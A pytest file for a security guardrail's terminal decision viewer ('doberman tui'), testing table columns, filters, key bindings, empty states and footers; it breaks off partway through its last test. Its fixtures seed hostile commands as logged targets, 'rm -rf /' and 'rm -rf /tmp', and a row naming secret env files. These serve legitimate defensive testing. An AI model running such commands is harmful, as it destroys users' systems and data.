"""Unit tests for the decision-transparency TUI (`doberman tui`).

Skips cleanly when `textual` is not installed — the standalone dev venv used
for the rest of the suite intentionally lacks it (a design constraint, not a
gap: `textual` is an optional extra, see pyproject.toml's `tui`/`dev` extras).
Run for real in the throwaway `tui-venv` (`pip install -e ".[dev,tui]"`),
where every test below actually executes instead of skipping.

The `doberman tui` CLI guard (missing the extra, or a nonexistent `--path`) is
tested in `test_explain.py` instead, since it must run WITHOUT textual
installed.
"""

import json
import re
from datetime import datetime, timezone

import pytest

pytest.importorskip("textual")

from rich.text import Text  # noqa: E402

import doberman.render as render  # noqa: E402
from doberman.models import (  # noqa: E402 — after the importorskip, by design
    ActionType,
    Decision,
    GuardrailResult,
    ReasonCode,
    Risk,
    SecurityObject,
    Verdict,
)
from doberman.render import verdict_rich_style  # noqa: E402
from doberman.storage.db import open_db  # noqa: E402
from doberman.storage.log import record_decision  # noqa: E402
from doberman.tui import (  # noqa: E402
    DecisionExplainerApp,
    WhyScreen,
    _all_targets_missing,
    _widths_for,
)

_NOW = datetime(2026, 7, 7, 12, 34, 56, tzinfo=timezone.utc)
_SECRET = "SYNTHETIC-SECRET-AKIA0000TEST"  # noqa: S105 — synthetic test fixture, not a real key


def _static_text(static) -> str:
    return str(static.content)


def _visible_footer_text(app) -> str:
    """The footer text a user actually SEES at the current terminal size - a
    binding can be `show=True` yet still scroll off past the right edge (the
    footer never wraps), so this checks each `FooterKey`'s own laid-out
    region against the footer's width rather than trusting `show` alone."""
    from textual.widgets._footer import FooterKey

    footer = app.query_one("Footer")
    parts = []
    for key in app.query(FooterKey):
        if key.region.x + key.region.width <= footer.size.width:
            parts.append(f"{key.key_display} {key.description}".strip())
    return "  ".join(parts)


async def _wait_for_footer_text(pilot, app, predicate, *, tries: int = 20, delay: float = 0.02):
    """Poll `_visible_footer_text(app)` through `predicate` until it holds, or
    `tries` attempts pass. Textual's Footer only recomposes after a dynamic
    `check_action` change (round 4 design critique item 3's row-action
    gating) via `refresh_bindings()` -> a signal -> `call_after_refresh` -
    genuinely eventually-consistent, so a single `pilot.pause()` can
    legitimately race it under load. Returns the last-seen text either way,
    so a real failure still shows a useful diff."""
    text = _visible_footer_text(app)
    for _ in range(tries):
        if predicate(text):
            return text
        await pilot.pause(delay)
        text = _visible_footer_text(app)
    return text


async def _wait_for(pilot, get_value, predicate, *, tries: int = 100, delay: float = 0.02):
    """General-purpose sibling of `_wait_for_footer_text` (round 5 design
    critique item 11): poll `get_value()` through `predicate` until it holds,
    or `tries * delay` (~2s by default) elapses. A widget's own update can
    legitimately land a tick after the change that triggers it - reading it
    right after a single `pilot.pause()` can race that under load. Returns the
    last-seen value either way, so a real failure still shows a useful diff."""
    value = get_value()
    for _ in range(tries):
        if predicate(value):
            return value
        await pilot.pause(delay)
        value = get_value()
    return value


def _svg_style_map(svg: str) -> dict[str, str]:
    return dict(re.findall(r"\.(terminal-\d+-r\d+)\s*\{\s*fill:\s*(#[0-9a-fA-F]{6})", svg))


_SVG_RECT_RE = re.compile(
    r'<rect fill="(#[0-9a-fA-F]{6})"[^>]*x="([\d.]+)"[^>]*y="([\d.]+)"[^>]*width="([\d.]+)"'
)


def _svg_cell_colors(svg: str, cell_text: str) -> list[tuple[str, str]]:
    """(text_hex, background_hex) for every table cell whose rendered text is
    exactly `cell_text` — used to check chip contrast against Rich's SVG
    export. Rich draws one background `<rect>` per cell at the same x as its
    text, ~18.5px above its text baseline `y`."""
    style_map = _svg_style_map(svg)
    needle = re.escape(cell_text.replace(" ", "&#160;"))
    text_re = re.compile(
        r'<text class="(terminal-\d+-r\d+)"[^>]*x="([\d.]+)"[^>]*y="([\d.]+)"'
        r'[^>]*textLength="[\d.]+"[^>]*>' + needle + r"</text>"
    )
    results = []
    for tm in text_re.finditer(svg):
        cls, x, y = tm.group(1), float(tm.group(2)), float(tm.group(3))
        text_hex = style_map[cls]
        target_rect_y = y - 18.5
        bg_hex = None
        for rm in _SVG_RECT_RE.finditer(svg):
            fill, rx, ry = rm.group(1), float(rm.group(2)), float(rm.group(3))
            if abs(ry - target_rect_y) < 2 and abs(rx - x) < 0.5:
                bg_hex = fill
                break
        assert bg_hex is not None, f"no background rect found for {cell_text!r} at x={x} y={y}"
        results.append((text_hex, bg_hex))
    return results


def _wcag_contrast_ratio(hex1: str, hex2: str) -> float:
    """WCAG 2.x relative-luminance contrast ratio between two `#rrggbb` colors."""

    def linear(channel: int) -> float:
        c = channel / 255
        return c / 12.92 if c <= 0.03928 else ((c + 0.055) / 1.055) ** 2.4

    def luminance(hex_color: str) -> float:
        h = hex_color.lstrip("#")
        r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
        return 0.2126 * linear(r) + 0.7152 * linear(g) + 0.0722 * linear(b)

    l1, l2 = luminance(hex1), luminance(hex2)
    lighter, darker = max(l1, l2), min(l1, l2)
    return (lighter + 0.05) / (darker + 0.05)


def _all_visible_text(app) -> str:
    """Everything the TUI currently displays: every table cell + the why-panel."""
    table = app.query_one("#decisions")
    chunks = []
    for row_index in range(table.row_count):
        for cell in table.get_row_at(row_index):
            chunks.append(getattr(cell, "plain", None) or str(cell))
    chunks.append(_static_text(app.query_one("#explanation")))
    return "\n".join(chunks)


async def _seed(
    root: str,
    *,
    action_id: str = "act-tui-1",
    target: str = "rm -rf /",
    verdict: Verdict = Verdict.BLOCK,
    risk: Risk = Risk.critical,
    reason_codes: list[ReasonCode] | None = None,
    auth_result: str | None = "blocked",
    ts=_NOW,
) -> None:
    reason_codes = reason_codes if reason_codes is not None else [ReasonCode.destructive_command]
    objective = GuardrailResult(
        verdict=verdict,
        risk=risk,
        reason_codes=reason_codes,
        explanation="test decision",
    )
    decision = Decision(
        action_id=action_id,
        final_verdict=verdict,
        final_risk=risk,
        objective=objective,
        reason_codes=reason_codes,
        explanation="test decision",
        decided_at=ts,
    )
    action = SecurityObject(
        id=action_id,
        ts=ts,
        agent_role="cli",
        action_type=ActionType.shell_exec,
        tool_name="bash",
        target=target,
    )
    await record_decision(decision, action, repo_root=root, auth_result=auth_result)


async def _seed_block(root: str, action_id: str = "act-tui-1", target: str = "rm -rf /") -> None:
    await _seed(root, action_id=action_id, target=target, verdict=Verdict.BLOCK)


async def _wait_loaded(pilot, app) -> None:
    """Wait for the app's background load worker to finish (call from inside
    ``async with app.run_test() as pilot:``)."""
    await pilot.pause()
    await app.wait_loaded()
    await pilot.pause()


# --- basic listing / explanation ---------------------------------------------


async def test_app_lists_seeded_rows_and_shows_explanation(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        assert table.row_count == 1
        explanation = app.query_one("#explanation")
        text = _static_text(explanation).lower()
        assert "source: offline template" in text
        assert "destructive" in text


async def test_next_line_present_for_block_and_auth_absent_for_pass(tmp_path):
    # design critique item 12 (round 1) + round 3 item 3: a "Next" line naming
    # a real command is docked in its OWN widget (`#next-line`), not the
    # scrollable why panel body - and none for PASS, since there's nothing to
    # act on.
    root = str(tmp_path)
    await _seed(root, action_id="act-block", verdict=Verdict.BLOCK)
    await _seed(
        root, action_id="act-auth", verdict=Verdict.AUTH, reason_codes=[ReasonCode.unknown_tool]
    )
    await _seed(root, action_id="act-pass", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")

        def _next_text() -> str:
            return _static_text(app.query_one("#next-line"))

        # DESC id order: row0=act-pass, row1=act-auth, row2=act-block.
        table.move_cursor(row=2)
        # round 5 design critique item 11: poll rather than a single
        # `pilot.pause()` - `on_data_table_row_highlighted` -> `_show_explanation`
        # -> `_update_next_line` can legitimately land a tick late under load.
        next_text = await _wait_for(pilot, _next_text, lambda t: "Next:" in t)
        assert "Next:" in next_text
        assert "doberman mode" in next_text
        assert "Next:" not in _static_text(app.query_one("#explanation"))
        table.move_cursor(row=1)
        next_text = await _wait_for(pilot, _next_text, lambda t: "doberman dash" in t)
        assert "Next:" in next_text
        assert "doberman dash" in next_text
        table.move_cursor(row=0)
        next_text = await _wait_for(pilot, _next_text, lambda t: t == "")
        assert next_text == ""


async def test_columns_are_plain_words_in_the_documented_order():
    app = DecisionExplainerApp(".")
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        labels = [str(col.label) for col in table.columns.values()]
        assert labels == ["", "verdict", "time", "risk", "auth", "action", "target", "why"]


async def test_verdict_cell_uses_ascii_glyph_and_the_shared_render_palette(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        verdict_cell = table.get_row_at(0)[1]
        assert verdict_cell.plain == "X BLOCK"
        assert verdict_cell.plain.isascii()
        assert verdict_cell.style == verdict_rich_style(Verdict.BLOCK, chip=True)


async def test_risk_cell_is_colored_by_severity(tmp_path):
    root = str(tmp_path)
    await _seed(root, action_id="act-1", verdict=Verdict.BLOCK, risk=Risk.critical)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        risk_cell = table.get_row_at(0)[3]
        assert risk_cell.plain == "critical"
        assert risk_cell.style == render.risk_rich_style("critical")


async def test_auth_cell_is_humanized(tmp_path):
    root = str(tmp_path)
    await _seed(
        root,
        action_id="act-1",
        verdict=Verdict.PASS,
        reason_codes=[],
        auth_result="executed",
    )
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        auth_cell = table.get_row_at(0)[4]
        assert auth_cell.plain == "ran"


async def test_time_column_shows_hhmmss_not_the_full_iso_timestamp(tmp_path):
    # `ts` is persisted as the real wall-clock time (storage/log.py's
    # `build_record`), so this checks the FORMAT rather than a fixed value:
    # HH:MM:SS, never the full ISO-8601 string (no "T", no date, no offset).
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        time_cell = table.get_row_at(0)[2]
        assert re.fullmatch(r"\d{2}:\d{2}:\d{2}", time_cell.plain), time_cell.plain


async def test_auth_cell_short_form_for_memory_approval(tmp_path):
    # round 3 design critique item 10 (CI fix): `doberman log` needs the full
    # "approved via 5-minute memory (soft_confirm)" phrase, but the tui's
    # 7-wide auth column can't fit it - it asks for the short form (round 4:
    # "memory ok" no longer fits either, once the auth column shrank further
    # to make room for `why` - it's "mem ok" now).
    root = str(tmp_path)
    await _seed(
        root,
        action_id="act-1",
        verdict=Verdict.PASS,
        reason_codes=[],
        auth_result="soft_confirm+memory",
    )
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        auth_cell = table.get_row_at(0)[4]
        assert auth_cell.plain == "mem ok"


async def test_date_bar_shows_the_selected_rows_date_and_the_verdict_legend(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        date_text = _static_text(app.query_one("#date-bar"))
        match = re.match(r"(\d{4}-\d{2}-\d{2})  (.+)", date_text)
        assert match, date_text
        assert match.group(2) == "X BLOCK  ! AUTH  . PASS"


# --- honest empty/missing states ---------------------------------------------


async def test_no_db_at_path_is_distinct_from_an_empty_db(tmp_path):
    from doberman.storage.db import db_path
    from doberman.tui import _shorten_home

    app = DecisionExplainerApp(str(tmp_path))
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        raw_text = _static_text(app.query_one("#explanation"))
        text = raw_text.lower()
        assert "no decision log at" in text
        # `~`-shortened when the path is under home (asserted via the same
        # helper the app uses, so this holds regardless of platform/home dir).
        assert _shorten_home(db_path(str(tmp_path))) in raw_text
        assert "doberman.db" in text
        assert "press q to quit, then rerun with --path" in text


async def test_empty_but_existing_db_gets_a_different_honest_message(tmp_path):
    root = str(tmp_path)
    async with open_db(root):
        pass  # creates .doberman/doberman.db with schema, zero decisions
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        text = _static_text(app.query_one("#explanation")).lower()
        assert "hasn't decided anything yet" in text
        assert "no decision log at" not in text
        # round 3 design critique item 9: the empty state isn't a dead end -
        # it names two concrete ways forward.
        assert "doberman demo --fast" in text
        assert "press r" in text


async def test_filtered_to_zero_matches_is_distinct_from_no_data(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        filter_input = app.query_one("#filter")
        filter_input.display = True
        filter_input.value = "no-such-substring-anywhere"
        # round 5 design critique item 11: poll rather than a single
        # `pilot.pause()` - `on_input_changed` -> `_apply_filter` ->
        # `_rebuild_table` can legitimately land a tick late under load.
        text = await _wait_for(
            pilot,
            lambda: _static_text(app.query_one("#explanation")),
            lambda t: t == "(no rows match the filter - press esc to clear it)",
        )
        assert text == "(no rows match the filter - press esc to clear it)"
        assert "hasn't decided anything yet" not in text
        assert "no decision log at" not in text


# --- bounded load / subtitle --------------------------------------------------


async def test_subtitle_reports_showing_n_of_m(tmp_path):
    root = str(tmp_path)
    for i in range(3):
        await _seed(root, action_id=f"act-{i}", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root, last=500)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        # Count first (design critique item 9) - it must survive truncation
        # at a narrow width; the path is the part that's safe to lose.
        assert app.sub_title == f"showing 3 of 3 - {root}"
        app.query_one("#filter").value = "block"
        # round 5 design critique item 11: poll - `on_input_changed` ->
        # `_apply_filter` -> `_update_subtitle` can legitimately land a tick
        # late under load, same race class as the two named tests.
        await _wait_for(pilot, lambda: app.sub_title, lambda t: t == f"showing 0 of 3 - {root}")
        assert app.sub_title == f"showing 0 of 3 - {root}"


async def test_last_bounds_how_many_rows_load(tmp_path):
    root = str(tmp_path)
    for i in range(5):
        await _seed(root, action_id=f"act-{i}", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root, last=2)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        assert table.row_count == 2
        # round 3 design critique item 5: "2 of 2" alone reads as "that's
        # everything" when the load actually hit the `--last` cap.
        assert app.sub_title == f"showing 2 of 2 (last 2; --last for more) - {root}"


# --- filter --------------------------------------------------------------


async def test_slash_opens_filter_and_narrows_rows_by_substring(tmp_path):
    root = str(tmp_path)
    await _seed(root, action_id="act-block", verdict=Verdict.BLOCK)
    await _seed(root, action_id="act-pass", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        assert table.row_count == 2
        await pilot.press("/")
        await pilot.pause()
        filter_input = app.query_one("#filter")
        assert filter_input.display is True
        assert app.focused is filter_input
        for ch in "block":
            await pilot.press(ch)
        await pilot.pause()
        assert table.row_count == 1
        assert table.get_row_at(0)[1].plain == "X BLOCK"


async def test_filter_placeholder_matches_what_it_actually_searches(tmp_path):
    # design critique item 11: copy must match behavior - the filter also
    # matches action type, so the placeholder must say so.
    app = DecisionExplainerApp(str(tmp_path))
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        placeholder = app.query_one("#filter").placeholder
        assert placeholder == "filter (verdict / target / action / reason codes)"


async def test_escape_clear_binding_shows_while_filter_focused_or_active(tmp_path):
    # design critique item 1 (round 1) + round 3: escape/"clear" must never be
    # a footer entry that does nothing - it's shown while the filter input has
    # focus, AND (round 3) while a filter is active from anywhere else, e.g.
    # the table, so a reviewer doesn't have to tab back just to dismiss it.
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        assert app.check_action("clear_filter", ()) is False
        await pilot.press("/")
        await pilot.pause()
        assert app.check_action("clear_filter", ()) is True
        for ch in "block":
            await pilot.press(ch)
        await pilot.pause()
        table = app.query_one("#decisions")
        table.focus()
        await pilot.pause()
        assert app.focused is table
        assert app.check_action("clear_filter", ()) is True  # filter still active


async def test_escape_clears_the_filter(tmp_path):
    root = str(tmp_path)
    await _seed(root, action_id="act-block", verdict=Verdict.BLOCK)
    await _seed(root, action_id="act-pass", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        await pilot.press("/")
        for ch in "block":
            await pilot.press(ch)
        await pilot.pause()
        assert table.row_count == 1
        await pilot.press("escape")
        await pilot.pause()
        assert table.row_count == 2
        assert app.query_one("#filter").display is False


async def test_escape_clears_an_active_filter_from_the_table_too(tmp_path):
    # round 3 design critique item 1: escape must also clear the filter when
    # the TABLE (not the filter box) has focus, as long as a filter is active.
    root = str(tmp_path)
    await _seed(root, action_id="act-block", verdict=Verdict.BLOCK)
    await _seed(root, action_id="act-pass", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        await pilot.press("/")
        for ch in "block":
            await pilot.press(ch)
        await pilot.pause()
        assert table.row_count == 1
        table.focus()
        await pilot.pause()
        assert app.focused is table
        await pilot.press("escape")
        await pilot.pause()
        assert table.row_count == 2
        assert app.query_one("#filter").display is False


async def test_enter_in_filter_keeps_it_and_returns_focus_to_table(tmp_path):
    # round 3 design critique item 1: Enter is a documented "exit" distinct
    # from Escape's "clear" - it commits the (already live-applied) filter and
    # returns focus to the table, rather than opening the why screen.
    root = str(tmp_path)
    await _seed(root, action_id="act-block", verdict=Verdict.BLOCK)
    await _seed(root, action_id="act-pass", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        await pilot.press("/")
        for ch in "block":
            await pilot.press(ch)
        await pilot.pause()
        assert table.row_count == 1
        await pilot.press("enter")
        await pilot.pause()
        assert not isinstance(app.screen, WhyScreen)  # enter committed, didn't open "why"
        assert app.focused is table
        assert app.query_one("#filter").value == "block"
        assert table.row_count == 1  # filter text stays applied


# --- next/prev BLOCK, next AUTH -----------------------------------------------


async def test_b_jumps_to_next_block_and_shift_b_to_previous(tmp_path):
    root = str(tmp_path)
    await _seed(root, action_id="act-1", verdict=Verdict.PASS, reason_codes=[])
    await _seed(root, action_id="act-2", verdict=Verdict.BLOCK)
    await _seed(root, action_id="act-3", verdict=Verdict.PASS, reason_codes=[])
    await _seed(root, action_id="act-4", verdict=Verdict.BLOCK)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        table.move_cursor(row=0)
        await pilot.press("b")
        await pilot.pause()
        first_block_row = table.cursor_row
        assert table.get_row_at(first_block_row)[1].plain == "X BLOCK"
        await pilot.press("b")
        await pilot.pause()
        second_block_row = table.cursor_row
        assert second_block_row != first_block_row
        assert table.get_row_at(second_block_row)[1].plain == "X BLOCK"
        await pilot.press("B")
        await pilot.pause()
        assert table.cursor_row == first_block_row


async def test_a_jumps_to_next_auth(tmp_path):
    root = str(tmp_path)
    await _seed(root, action_id="act-1", verdict=Verdict.PASS, reason_codes=[])
    await _seed(
        root, action_id="act-2", verdict=Verdict.AUTH, reason_codes=[ReasonCode.unknown_tool]
    )
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        table.move_cursor(row=0)
        await pilot.press("a")
        await pilot.pause()
        assert table.get_row_at(table.cursor_row)[1].plain == "! AUTH"


async def test_jumps_notify_when_nothing_matches(tmp_path, monkeypatch):
    # design critique item 5: b/B/a must say when nothing matched, not just
    # silently sit still.
    root = str(tmp_path)
    await _seed(root, action_id="act-1", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        notified = []
        monkeypatch.setattr(app, "notify", lambda msg, **kw: notified.append(msg))
        await pilot.press("b")
        await pilot.pause()
        assert notified == ["no BLOCK rows in view"]
        notified.clear()
        await pilot.press("a")
        await pilot.pause()
        assert notified == ["no AUTH rows in view"]


# --- dead keys: no row actions when there's nothing to act on ---------------


async def test_row_actions_are_hidden_dead_keys_when_no_rows_are_visible(tmp_path):
    # round 4 design critique item 3: with nothing loaded, `why`/`copy
    # id`/next-prev-BLOCK/next-AUTH must not be footer entries that visibly do
    # nothing when pressed - a dead key is a trap, not a shortcut.
    root = str(tmp_path)
    async with open_db(root):
        pass  # a real, empty decision log - no rows recorded
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        assert app._visible_rows == []
        for action in ("open_why", "copy_action_id", "next_block", "prev_block", "next_auth"):
            assert app.check_action(action, ()) is False, action
        footer_text = await _wait_for_footer_text(
            pilot, app, lambda t: "next BLOCK" not in t and "copy id" not in t
        )
        for label in ("why", "next BLOCK", "prev BLOCK", "next AUTH", "copy id"):
            assert label not in footer_text, label
        await pilot.press("w")  # genuinely inert, not just hidden
        await pilot.pause()
        assert not isinstance(app.screen, WhyScreen)


async def test_row_actions_are_also_hidden_when_a_filter_matches_zero_rows(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        assert app.check_action("open_why", ()) is True  # one row visible: enabled
        app.query_one("#filter").value = "no-such-substring-anywhere"
        # round 5 design critique item 11: poll (`on_input_changed` ->
        # `_apply_filter` can legitimately land a tick late under load) rather
        # than trust a single `pilot.pause()`.
        await _wait_for(pilot, lambda: app._visible_rows, lambda rows: rows == [])
        assert app._visible_rows == []
        for action in ("open_why", "copy_action_id", "next_block", "prev_block", "next_auth"):
            assert app.check_action(action, ()) is False, action


# --- home/end ------------------------------------------------------------


async def test_home_and_end_jump_to_first_and_last_row(tmp_path):
    root = str(tmp_path)
    for i in range(4):
        await _seed(root, action_id=f"act-{i}", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        table.move_cursor(row=2)
        await pilot.press("end")
        await pilot.pause()
        assert table.cursor_row == table.row_count - 1
        await pilot.press("home")
        await pilot.pause()
        assert table.cursor_row == 0


async def test_home_and_end_move_the_table_cursor_even_when_the_why_panel_has_focus(tmp_path):
    # design critique item 15: Home/End must not be a no-op just because the
    # docked why panel (not the table) currently has focus.
    root = str(tmp_path)
    for i in range(4):
        await _seed(root, action_id=f"act-{i}", verdict=Verdict.PASS, reason_codes=[])
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        panel = app.query_one("#explanation-scroll")
        table.move_cursor(row=2)
        await pilot.press("tab")
        await pilot.pause()
        assert app.focused is panel
        await pilot.press("end")
        await pilot.pause()
        assert table.cursor_row == table.row_count - 1
        assert app.focused is panel  # the key moved the cursor, not the focus
        await pilot.press("home")
        await pilot.pause()
        assert table.cursor_row == 0
        assert app.focused is panel


# --- copy action id --------------------------------------------------------


async def test_y_copies_the_selected_action_id(tmp_path, monkeypatch):
    root = str(tmp_path)
    await _seed_block(root, action_id="act-copy-me")
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        copied = {}
        notified = {}
        monkeypatch.setattr(app, "copy_to_clipboard", lambda text: copied.setdefault("text", text))
        monkeypatch.setattr(app, "notify", lambda msg, **kw: notified.setdefault("msg", msg))
        await pilot.press("y")
        await pilot.pause()
        assert copied["text"] == "act-copy-me"
        # round 4 design critique item 9: drop the "OSC 52" jargon, be honest
        # instead that it's a request the terminal may or may not honor.
        assert (
            notified["msg"]
            == "copy requested: act-copy-me - your terminal decides whether it lands"
        )


async def test_y_also_copies_the_action_id_from_inside_the_why_screen(tmp_path, monkeypatch):
    # round 4 design critique item 4: `y` must work from inside the why
    # screen too, copying whichever row that screen is currently showing.
    root = str(tmp_path)
    await _seed_block(root, action_id="act-copy-from-why")
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        copied = {}
        notified = {}
        monkeypatch.setattr(app, "copy_to_clipboard", lambda text: copied.setdefault("text", text))
        monkeypatch.setattr(app, "notify", lambda msg, **kw: notified.setdefault("msg", msg))
        await pilot.press("w")
        await pilot.pause()
        assert isinstance(app.screen, WhyScreen)
        await pilot.press("y")
        await pilot.pause()
        assert copied["text"] == "act-copy-from-why"
        assert "act-copy-from-why" in notified["msg"]
        # And its footer offers it, same as the main browser's.
        footer_text = _visible_footer_text(app.screen)
        assert "copy id" in footer_text


# --- focus / full-screen why / help -----------------------------------------


async def test_tab_moves_focus_between_table_and_why_panel(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        assert app.focused is table
        await pilot.press("tab")
        await pilot.pause()
        assert app.focused is app.query_one("#explanation-scroll")
        await pilot.press("tab")
        await pilot.pause()
        assert app.focused is table


async def test_table_and_why_panel_get_a_distinct_focus_border(tmp_path):
    # design critique item 2: `tab` must be visible, not just functional -
    # each widget's border must differ between its focused and unfocused state.
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        table = app.query_one("#decisions")
        panel = app.query_one("#explanation-scroll")
        assert app.focused is table
        table_focused_border = table.styles.border_top
        panel_unfocused_border = panel.styles.border_top
        await pilot.press("tab")
        await pilot.pause()
        assert app.focused is panel
        table_unfocused_border = table.styles.border_top
        panel_focused_border = panel.styles.border_top
        assert table_focused_border != table_unfocused_border
        assert panel_focused_border != panel_unfocused_border


async def test_enter_opens_full_screen_why_with_full_reason_codes_and_action_id(tmp_path):
    root = str(tmp_path)
    await _seed(
        root,
        action_id="act-full-why",
        verdict=Verdict.BLOCK,
        reason_codes=[ReasonCode.destructive_command, ReasonCode.bulk_operation],
    )
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        await pilot.press("enter")
        await pilot.pause()
        assert isinstance(app.screen, WhyScreen)
        full_text = _static_text(app.screen.query_one("#why-text"))
        assert "destructive_command" in full_text
        assert "bulk_operation" in full_text
        assert "act-full-why" in full_text
        # design critique item 12: a "Next" step naming a real command.
        assert "Next:" in full_text
        assert "doberman mode" in full_text
        await pilot.press("escape")
        await pilot.pause()
        assert not isinstance(app.screen, WhyScreen)


async def test_why_screen_shows_row_identity_header_and_bBa_in_its_footer(tmp_path, monkeypatch):
    # round 3 design critique item 4: paging through rows with b/B/a inside
    # the why screen must never lose track of which row is on screen - the
    # first line names verdict, time, risk, action, target; the footer offers
    # b/B/a directly, not just esc close.
    # A hand-built row (like `test_row_derived_markup_renders_literally`):
    # `_seed`'s helper always writes `action_type=shell_exec` (no path class)
    # and `build_record` stamps `ts` with the real wall clock, not the `ts`
    # passed in - neither is controllable through the real storage pipeline.
    row = {
        "ts": "2026-07-07T01:45:24+00:00",
        "action_id": "act-header",
        "agent_role": "cli",
        "action_type": "file_read",
        "target_path_class": "backend/secrets/*.env",
        "risk": "high",
        "source_context": "user",
        "final_verdict": "BLOCK",
        "decided_layer": "objective",
        "reason_codes_json": json.dumps(["sensitive_path_access"]),
    }

    async def _fake_read(_root, *, limit=None):
        return [row]

    monkeypatch.setattr("doberman.tui.read_decisions", _fake_read)
    root = str(tmp_path)
    async with open_db(root):
        pass  # `_load_rows` only calls read_decisions once the DB file exists
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        await pilot.press("w")
        await pilot.pause()
        assert isinstance(app.screen, WhyScreen)
        full_text = _static_text(app.screen.query_one("#why-text"))
        first_line = full_text.splitlines()[0]
        assert first_line == "X BLOCK  2026-07-07 01:45:24  high  file_read  backend/secrets/*.env"
        # The modal's own Footer needs an extra tick to lay out its FooterKey
        # children after the screen push.
        await pilot.pause()
        footer_text = _visible_footer_text(app.screen)
        assert "next BLOCK" in footer_text
        assert "prev BLOCK" in footer_text
        assert "next AUTH" in footer_text
        assert "close" in footer_text


async def test_w_also_opens_the_full_screen_why(tmp_path):
    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        await pilot.press("w")
        await pilot.pause()
        assert isinstance(app.screen, WhyScreen)


async def test_why_screen_is_modal(tmp_path):
    from textual.screen import ModalScreen

    root = str(tmp_path)
    await _seed_block(root)
    app = DecisionExplainerApp(root)
    async with app.run_test() as pilot:
        await _wait_loaded(pilot, app)
        await pilot.press("w")
        await pilot.pause()
        assert isinstance(app.screen, ModalScreen)


async def test_why_screen_b_jumps_to_next_block_and_updates_its_own_text(tmp_path):
    # design critique item 3: b/B/a must work FROM INSIDE the why screen,
    # moving the table's cursor AND re-rendering the screen's own text.
    root = str(tmp_path)
    await _seed(root, action_id="act-pass", verdict=Verdict.PASS, reason_codes=[])
    await _seed(root, action_id="act-block-1", verdict=Verdict.BLOCK)
    await _seed(root, action_id="act-block-2", verdict=Verdict.BLOCK, target="rm -rf /tmp")
    app = DecisionExplainerApp(root)
